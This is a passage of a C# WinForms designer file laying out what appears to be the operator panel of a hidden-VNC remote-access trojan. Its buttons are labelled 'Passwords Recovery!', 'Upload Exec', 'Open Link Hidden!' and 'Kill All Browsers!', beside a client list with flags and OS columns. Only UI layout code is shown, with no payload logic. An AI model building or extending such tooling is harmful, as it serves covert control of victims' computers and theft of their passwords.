            this.columnHeader10.Text = "Operationg System";
            this.columnHeader10.Width = 198;
            // 
            // columnHeader11
            // 
            this.columnHeader11.Text = "Install Date";
            this.columnHeader11.Width = 153;
            // 
            // columnHeader12
            // 
            this.columnHeader12.Text = "Version";
            this.columnHeader12.Width = 82;
            // 
            // imageList1
            // 
            this.imageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList1.ImageStream")));
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "ad.png");
            this.imageList1.Images.SetKeyName(1, "ae.png");
            this.imageList1.Images.SetKeyName(2, "af.png");
            this.imageList1.Images.SetKeyName(3, "ag.png");
            this.imageList1.Images.SetKeyName(4, "ai.png");
            this.imageList1.Images.SetKeyName(5, "al.png");
            this.imageList1.Images.SetKeyName(6, "am.png");
            this.imageList1.Images.SetKeyName(7, "an.png");
            this.imageList1.Images.SetKeyName(8, "ao.png");
            this.imageList1.Images.SetKeyName(9, "ar.png");
            this.imageList1.Images.SetKeyName(10, "as.png");
            this.imageList1.Images.SetKeyName(11, "at.png");
            this.imageList1.Images.SetKeyName(12, "au.png");
            this.imageList1.Images.SetKeyName(13, "aw.png");
            this.imageList1.Images.SetKeyName(14, "ax.png");
            this.imageList1.Images.SetKeyName(15, "az.png");
            this.imageList1.Images.SetKeyName(16, "ba.png");
            this.imageList1.Images.SetKeyName(17, "bb.png");
            this.imageList1.Images.SetKeyName(18, "bd.png");
            this.imageList1.Images.SetKeyName(19, "be.png");
            this.imageList1.Images.SetKeyName(20, "bf.png");
            this.imageList1.Images.SetKeyName(21, "bg.png");
            this.imageList1.Images.SetKeyName(22, "bh.png");
            this.imageList1.Images.SetKeyName(23, "bi.png");
            this.imageList1.Images.SetKeyName(24, "bj.png");
            this.imageList1.Images.SetKeyName(25, "bm.png");
            this.imageList1.Images.SetKeyName(26, "bn.png");
            this.imageList1.Images.SetKeyName(27, "bo.png");
            this.imageList1.Images.SetKeyName(28, "br.png");
            this.imageList1.Images.SetKeyName(29, "bs.png");
            this.imageList1.Images.SetKeyName(30, "bt.png");
            this.imageList1.Images.SetKeyName(31, "bv.png");
            this.imageList1.Images.SetKeyName(32, "bw.png");
            this.imageList1.Images.SetKeyName(33, "by.png");
            this.imageList1.Images.SetKeyName(34, "bz.png");
            this.imageList1.Images.SetKeyName(35, "ca.png");
            this.imageList1.Images.SetKeyName(36, "catalonia.png");
            this.imageList1.Images.SetKeyName(37, "cc.png");
            this.imageList1.Images.SetKeyName(38, "cd.png");
            this.imageList1.Images.SetKeyName(39, "cf.png");
            this.imageList1.Images.SetKeyName(40, "cg.png");
            this.imageList1.Images.SetKeyName(41, "ch.png");
            this.imageList1.Images.SetKeyName(42, "ci.png");
            this.imageList1.Images.SetKeyName(43, "ck.png");
            this.imageList1.Images.SetKeyName(44, "cl.png");
            this.imageList1.Images.SetKeyName(45, "cm.png");
            this.imageList1.Images.SetKeyName(46, "cn.png");
            this.imageList1.Images.SetKeyName(47, "co.png");
            this.imageList1.Images.SetKeyName(48, "cr.png");
            this.imageList1.Images.SetKeyName(49, "cs.png");
            this.imageList1.Images.SetKeyName(50, "cu.png");
            this.imageList1.Images.SetKeyName(51, "cv.png");
            this.imageList1.Images.SetKeyName(52, "cx.png");
            this.imageList1.Images.SetKeyName(53, "cy.png");
            this.imageList1.Images.SetKeyName(54, "cz.png");
            this.imageList1.Images.SetKeyName(55, "de.png");
            this.imageList1.Images.SetKeyName(56, "dj.png");
            this.imageList1.Images.SetKeyName(57, "dk.png");
            this.imageList1.Images.SetKeyName(58, "dm.png");
            this.imageList1.Images.SetKeyName(59, "do.png");
            this.imageList1.Images.SetKeyName(60, "dz.png");
            this.imageList1.Images.SetKeyName(61, "ec.png");
            this.imageList1.Images.SetKeyName(62, "ee.png");
            this.imageList1.Images.SetKeyName(63, "eg.png");
            this.imageList1.Images.SetKeyName(64, "eh.png");
            this.imageList1.Images.SetKeyName(65, "england.png");
            this.imageList1.Images.SetKeyName(66, "er.png");
            this.imageList1.Images.SetKeyName(67, "es.png");
            this.imageList1.Images.SetKeyName(68, "et.png");
            this.imageList1.Images.SetKeyName(69, "europeanunion.png");
            this.imageList1.Images.SetKeyName(70, "fam.png");
            this.imageList1.Images.SetKeyName(71, "fi.png");
            this.imageList1.Images.SetKeyName(72, "fj.png");
            this.imageList1.Images.SetKeyName(73, "fk.png");
            this.imageList1.Images.SetKeyName(74, "fm.png");
            this.imageList1.Images.SetKeyName(75, "fo.png");
            this.imageList1.Images.SetKeyName(76, "fr.png");
            this.imageList1.Images.SetKeyName(77, "ga.png");
            this.imageList1.Images.SetKeyName(78, "gb.png");
            this.imageList1.Images.SetKeyName(79, "gd.png");
            this.imageList1.Images.SetKeyName(80, "ge.png");
            this.imageList1.Images.SetKeyName(81, "gf.png");
            this.imageList1.Images.SetKeyName(82, "gh.png");
            this.imageList1.Images.SetKeyName(83, "gi.png");
            this.imageList1.Images.SetKeyName(84, "gl.png");
            this.imageList1.Images.SetKeyName(85, "gm.png");
            this.imageList1.Images.SetKeyName(86, "gn.png");
            this.imageList1.Images.SetKeyName(87, "gp.png");
            this.imageList1.Images.SetKeyName(88, "gq.png");
            this.imageList1.Images.SetKeyName(89, "gr.png");
            this.imageList1.Images.SetKeyName(90, "gs.png");
            this.imageList1.Images.SetKeyName(91, "gt.png");
            this.imageList1.Images.SetKeyName(92, "gu.png");
            this.imageList1.Images.SetKeyName(93, "gw.png");
            this.imageList1.Images.SetKeyName(94, "gy.png");
            this.imageList1.Images.SetKeyName(95, "hk.png");
            this.imageList1.Images.SetKeyName(96, "hm.png");
            this.imageList1.Images.SetKeyName(97, "hn.png");
            this.imageList1.Images.SetKeyName(98, "hr.png");
            this.imageList1.Images.SetKeyName(99, "ht.png");
            this.imageList1.Images.SetKeyName(100, "hu.png");
            this.imageList1.Images.SetKeyName(101, "id.png");
            this.imageList1.Images.SetKeyName(102, "ie.png");
            this.imageList1.Images.SetKeyName(103, "il.png");
            this.imageList1.Images.SetKeyName(104, "in.png");
            this.imageList1.Images.SetKeyName(105, "io.png");
            this.imageList1.Images.SetKeyName(106, "iq.png");
            this.imageList1.Images.SetKeyName(107, "ir.png");
            this.imageList1.Images.SetKeyName(108, "is.png");
            this.imageList1.Images.SetKeyName(109, "it.png");
            this.imageList1.Images.SetKeyName(110, "jm.png");
            this.imageList1.Images.SetKeyName(111, "jo.png");
            this.imageList1.Images.SetKeyName(112, "jp.png");
            this.imageList1.Images.SetKeyName(113, "ke.png");
            this.imageList1.Images.SetKeyName(114, "kg.png");
            this.imageList1.Images.SetKeyName(115, "kh.png");
            this.imageList1.Images.SetKeyName(116, "ki.png");
            this.imageList1.Images.SetKeyName(117, "km.png");
            this.imageList1.Images.SetKeyName(118, "kn.png");
            this.imageList1.Images.SetKeyName(119, "kp.png");
            this.imageList1.Images.SetKeyName(120, "kr.png");
            this.imageList1.Images.SetKeyName(121, "kw.png");
            this.imageList1.Images.SetKeyName(122, "ky.png");
            this.imageList1.Images.SetKeyName(123, "kz.png");
            this.imageList1.Images.SetKeyName(124, "la.png");
            this.imageList1.Images.SetKeyName(125, "lb.png");
            this.imageList1.Images.SetKeyName(126, "lc.png");
            this.imageList1.Images.SetKeyName(127, "li.png");
            this.imageList1.Images.SetKeyName(128, "lk.png");
            this.imageList1.Images.SetKeyName(129, "lr.png");
            this.imageList1.Images.SetKeyName(130, "ls.png");
            this.imageList1.Images.SetKeyName(131, "lt.png");
            this.imageList1.Images.SetKeyName(132, "lu.png");
            this.imageList1.Images.SetKeyName(133, "lv.png");
            this.imageList1.Images.SetKeyName(134, "ly.png");
            this.imageList1.Images.SetKeyName(135, "ma.png");
            this.imageList1.Images.SetKeyName(136, "mc.png");
            this.imageList1.Images.SetKeyName(137, "md.png");
            this.imageList1.Images.SetKeyName(138, "me.png");
            this.imageList1.Images.SetKeyName(139, "mg.png");
            this.imageList1.Images.SetKeyName(140, "mh.png");
            this.imageList1.Images.SetKeyName(141, "mk.png");
            this.imageList1.Images.SetKeyName(142, "ml.png");
            this.imageList1.Images.SetKeyName(143, "mm.png");
            this.imageList1.Images.SetKeyName(144, "mn.png");
            this.imageList1.Images.SetKeyName(145, "mo.png");
            this.imageList1.Images.SetKeyName(146, "mp.png");
            this.imageList1.Images.SetKeyName(147, "mq.png");
            this.imageList1.Images.SetKeyName(148, "mr.png");
            this.imageList1.Images.SetKeyName(149, "ms.png");
            this.imageList1.Images.SetKeyName(150, "mt.png");
            this.imageList1.Images.SetKeyName(151, "mu.png");
            this.imageList1.Images.SetKeyName(152, "mv.png");
            this.imageList1.Images.SetKeyName(153, "mw.png");
            this.imageList1.Images.SetKeyName(154, "mx.png");
            this.imageList1.Images.SetKeyName(155, "my.png");
            this.imageList1.Images.SetKeyName(156, "mz.png");
            this.imageList1.Images.SetKeyName(157, "na.png");
            this.imageList1.Images.SetKeyName(158, "nc.png");
            this.imageList1.Images.SetKeyName(159, "ne.png");
            this.imageList1.Images.SetKeyName(160, "nf.png");
            this.imageList1.Images.SetKeyName(161, "ng.png");
            this.imageList1.Images.SetKeyName(162, "ni.png");
            this.imageList1.Images.SetKeyName(163, "nl.png");
            this.imageList1.Images.SetKeyName(164, "no.png");
            this.imageList1.Images.SetKeyName(165, "np.png");
            this.imageList1.Images.SetKeyName(166, "nr.png");
            this.imageList1.Images.SetKeyName(167, "nu.png");
            this.imageList1.Images.SetKeyName(168, "nz.png");
            this.imageList1.Images.SetKeyName(169, "om.png");
            this.imageList1.Images.SetKeyName(170, "pa.png");
            this.imageList1.Images.SetKeyName(171, "pe.png");
            this.imageList1.Images.SetKeyName(172, "pf.png");
            this.imageList1.Images.SetKeyName(173, "pg.png");
            this.imageList1.Images.SetKeyName(174, "ph.png");
            this.imageList1.Images.SetKeyName(175, "pk.png");
            this.imageList1.Images.SetKeyName(176, "pl.png");
            this.imageList1.Images.SetKeyName(177, "pm.png");
            this.imageList1.Images.SetKeyName(178, "pn.png");
            this.imageList1.Images.SetKeyName(179, "pr.png");
            this.imageList1.Images.SetKeyName(180, "ps.png");
            this.imageList1.Images.SetKeyName(181, "pt.png");
            this.imageList1.Images.SetKeyName(182, "pw.png");
            this.imageList1.Images.SetKeyName(183, "py.png");
            this.imageList1.Images.SetKeyName(184, "qa.png");
            this.imageList1.Images.SetKeyName(185, "re.png");
            this.imageList1.Images.SetKeyName(186, "ro.png");
            this.imageList1.Images.SetKeyName(187, "rs.png");
            this.imageList1.Images.SetKeyName(188, "ru.png");
            this.imageList1.Images.SetKeyName(189, "rw.png");
            this.imageList1.Images.SetKeyName(190, "sa.png");
            this.imageList1.Images.SetKeyName(191, "sb.png");
            this.imageList1.Images.SetKeyName(192, "sc.png");
            this.imageList1.Images.SetKeyName(193, "scotland.png");
            this.imageList1.Images.SetKeyName(194, "sd.png");
            this.imageList1.Images.SetKeyName(195, "se.png");
            this.imageList1.Images.SetKeyName(196, "sg.png");
            this.imageList1.Images.SetKeyName(197, "sh.png");
            this.imageList1.Images.SetKeyName(198, "si.png");
            this.imageList1.Images.SetKeyName(199, "sj.png");
            this.imageList1.Images.SetKeyName(200, "sk.png");
            this.imageList1.Images.SetKeyName(201, "sl.png");
            this.imageList1.Images.SetKeyName(202, "sm.png");
            this.imageList1.Images.SetKeyName(203, "sn.png");
            this.imageList1.Images.SetKeyName(204, "so.png");
            this.imageList1.Images.SetKeyName(205, "sr.png");
            this.imageList1.Images.SetKeyName(206, "st.png");
            this.imageList1.Images.SetKeyName(207, "sv.png");
            this.imageList1.Images.SetKeyName(208, "sy.png");
            this.imageList1.Images.SetKeyName(209, "sz.png");
            this.imageList1.Images.SetKeyName(210, "tc.png");
            this.imageList1.Images.SetKeyName(211, "td.png");
            this.imageList1.Images.SetKeyName(212, "tf.png");
            this.imageList1.Images.SetKeyName(213, "tg.png");
            this.imageList1.Images.SetKeyName(214, "th.png");
            this.imageList1.Images.SetKeyName(215, "tj.png");
            this.imageList1.Images.SetKeyName(216, "tk.png");
            this.imageList1.Images.SetKeyName(217, "tl.png");
            this.imageList1.Images.SetKeyName(218, "tm.png");
            this.imageList1.Images.SetKeyName(219, "tn.png");
            this.imageList1.Images.SetKeyName(220, "to.png");
            this.imageList1.Images.SetKeyName(221, "tr.png");
            this.imageList1.Images.SetKeyName(222, "tt.png");
            this.imageList1.Images.SetKeyName(223, "tv.png");
            this.imageList1.Images.SetKeyName(224, "tw.png");
            this.imageList1.Images.SetKeyName(225, "tz.png");
            this.imageList1.Images.SetKeyName(226, "ua.png");
            this.imageList1.Images.SetKeyName(227, "ug.png");
            this.imageList1.Images.SetKeyName(228, "um.png");
            this.imageList1.Images.SetKeyName(229, "us.png");
            this.imageList1.Images.SetKeyName(230, "uy.png");
            this.imageList1.Images.SetKeyName(231, "uz.png");
            this.imageList1.Images.SetKeyName(232, "va.png");
            this.imageList1.Images.SetKeyName(233, "vc.png");
            this.imageList1.Images.SetKeyName(234, "ve.png");
            this.imageList1.Images.SetKeyName(235, "vg.png");
            this.imageList1.Images.SetKeyName(236, "vi.png");
            this.imageList1.Images.SetKeyName(237, "vn.png");
            this.imageList1.Images.SetKeyName(238, "vu.png");
            this.imageList1.Images.SetKeyName(239, "wales.png");
            this.imageList1.Images.SetKeyName(240, "wf.png");
            this.imageList1.Images.SetKeyName(241, "ws.png");
            this.imageList1.Images.SetKeyName(242, "xy.png");
            this.imageList1.Images.SetKeyName(243, "ye.png");
            this.imageList1.Images.SetKeyName(244, "yt.png");
            this.imageList1.Images.SetKeyName(245, "za.png");
            this.imageList1.Images.SetKeyName(246, "zm.png");
            this.imageList1.Images.SetKeyName(247, "zw.png");
            // 
            // guna2Panel4
            // 
            this.guna2Panel4.Controls.Add(this.label15);
            this.guna2Panel4.Controls.Add(this.btnVisitUrl);
            this.guna2Panel4.Controls.Add(this.btnRecover);
            this.guna2Panel4.Controls.Add(this.btnKillChrome);
            this.guna2Panel4.Controls.Add(this.btnresetScale);
            this.guna2Panel4.Controls.Add(this.btnRemoveHvnc);
            this.guna2Panel4.Controls.Add(this.btnAbouthvnc);
            this.guna2Panel4.Controls.Add(this.btnUploadExec);
            this.guna2Panel4.Controls.Add(this.guna2Separator7);
            this.loadForm.SetDecoration(this.guna2Panel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Panel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Panel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Panel4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Panel4.Dock = System.Windows.Forms.DockStyle.Bottom;
            this.guna2Panel4.Location = new System.Drawing.Point(3, 623);
            this.guna2Panel4.Name = "guna2Panel4";
            this.guna2Panel4.Size = new System.Drawing.Size(1545, 60);
            this.guna2Panel4.TabIndex = 4;
            // 
            // label15
            // 
            this.label15.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.label15.AutoSize = true;
            this.label15.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.label15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label15, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label15.Font = new System.Drawing.Font("Century Gothic", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label15.ForeColor = System.Drawing.Color.WhiteSmoke;
            this.label15.Location = new System.Drawing.Point(1281, 24);
            this.label15.Name = "label15";
            this.label15.Size = new System.Drawing.Size(249, 17);
            this.label15.TabIndex = 154;
            this.label15.Text = "Double Click on Client to activate HVNC";
            // 
            // btnVisitUrl
            // 
            this.btnVisitUrl.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.btnVisitUrl.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.btnVisitUrl.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnVisitUrl.BorderRadius = 12;
            this.btnVisitUrl.BorderThickness = 1;
            this.btnVisitUrl.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnVisitUrl.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnVisitUrl.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnVisitUrl.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.btnVisitUrl, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnVisitUrl, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnVisitUrl, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnVisitUrl, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnVisitUrl.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnVisitUrl.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnVisitUrl.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnVisitUrl.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnVisitUrl.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnVisitUrl.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnVisitUrl.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnVisitUrl.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnVisitUrl.ForeColor = System.Drawing.Color.White;
            this.btnVisitUrl.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnVisitUrl.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnVisitUrl.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnVisitUrl.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnVisitUrl.Image = ((System.Drawing.Image)(resources.GetObject("btnVisitUrl.Image")));
            this.btnVisitUrl.ImageSize = new System.Drawing.Size(40, 40);
            this.btnVisitUrl.Location = new System.Drawing.Point(177, 6);
            this.btnVisitUrl.Name = "btnVisitUrl";
            this.btnVisitUrl.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnVisitUrl.Size = new System.Drawing.Size(54, 48);
            this.btnVisitUrl.TabIndex = 153;
            this.guna2HtmlToolTip1.SetToolTip(this.btnVisitUrl, "Open Link Hidden!");
            this.btnVisitUrl.Click += new System.EventHandler(this.btnVisitUrl_Click);
            // 
            // btnRecover
            // 
            this.btnRecover.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.btnRecover.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.btnRecover.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnRecover.BorderRadius = 12;
            this.btnRecover.BorderThickness = 1;
            this.btnRecover.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnRecover.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnRecover.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnRecover.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.btnRecover, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnRecover, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnRecover, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnRecover, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnRecover.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnRecover.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnRecover.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnRecover.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnRecover.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnRecover.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnRecover.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnRecover.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnRecover.ForeColor = System.Drawing.Color.White;
            this.btnRecover.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnRecover.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnRecover.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnRecover.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnRecover.Image = ((System.Drawing.Image)(resources.GetObject("btnRecover.Image")));
            this.btnRecover.ImageSize = new System.Drawing.Size(40, 40);
            this.btnRecover.Location = new System.Drawing.Point(351, 6);
            this.btnRecover.Name = "btnRecover";
            this.btnRecover.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnRecover.Size = new System.Drawing.Size(54, 48);
            this.btnRecover.TabIndex = 36;
            this.guna2HtmlToolTip1.SetToolTip(this.btnRecover, "Passwords Recovery!");
            this.btnRecover.Visible = false;
            this.btnRecover.Click += new System.EventHandler(this.btnRecover_Click);
            // 
            // btnKillChrome
            // 
            this.btnKillChrome.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.btnKillChrome.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.btnKillChrome.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnKillChrome.BorderRadius = 12;
            this.btnKillChrome.BorderThickness = 1;
            this.btnKillChrome.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnKillChrome.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnKillChrome.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnKillChrome.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.btnKillChrome, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnKillChrome, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnKillChrome, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnKillChrome, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnKillChrome.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnKillChrome.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnKillChrome.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnKillChrome.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnKillChrome.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnKillChrome.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnKillChrome.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnKillChrome.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnKillChrome.ForeColor = System.Drawing.Color.White;
            this.btnKillChrome.GradientMode = System.Drawing.Drawing2D.LinearGradientMode.ForwardDiagonal;
            this.btnKillChrome.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnKillChrome.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnKillChrome.HoverState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnKillChrome.Image = ((System.Drawing.Image)(resources.GetObject("btnKillChrome.Image")));
            this.btnKillChrome.ImageSize = new System.Drawing.Size(40, 40);
            this.btnKillChrome.Location = new System.Drawing.Point(293, 6);
            this.btnKillChrome.Name = "btnKillChrome";
            this.btnKillChrome.PressedColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnKillChrome.Size = new System.Drawing.Size(54, 48);
            this.btnKillChrome.TabIndex = 34;
            this.guna2HtmlToolTip1.SetToolTip(this.btnKillChrome, "Kill All Browsers!");
            this.btnKillChrome.Click += new System.EventHandler(this.btnKillChrome_Click);
            // 
            // btnresetScale
            // 
            this.btnresetScale.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.btnresetScale.BackgroundImageLayout = System.Windows.Forms.ImageLayout.None;
            this.btnresetScale.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnresetScale.BorderRadius = 12;
            this.btnresetScale.BorderThickness = 1;
            this.btnresetScale.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.btnresetScale.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.btnresetScale.CheckedState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnresetScale.CustomImages.ImageAlign = System.Windows.Forms.HorizontalAlignment.Center;
            this.guna2Transition2.SetDecoration(this.btnresetScale, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.btnresetScale, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.btnresetScale, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.btnresetScale, Guna.UI2.AnimatorNS.DecorationType.None);
            this.btnresetScale.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
            this.btnresetScale.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
            this.btnresetScale.DisabledState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnresetScale.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(169)))), ((int)(((byte)(169)))), ((int)(((byte)(169)))));
            this.btnresetScale.DisabledState.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(141)))), ((int)(((byte)(141)))), ((int)(((byte)(141)))));
            this.btnresetScale.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(45)))), ((int)(((byte)(47)))), ((int)(((byte)(59)))));
            this.btnresetScale.FillColor2 = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.btnresetScale.Font = new System.Drawing.Font("Segoe UI", 9F);
            this.btnresetScale.ForeColor = System.Drawing.Color.White;
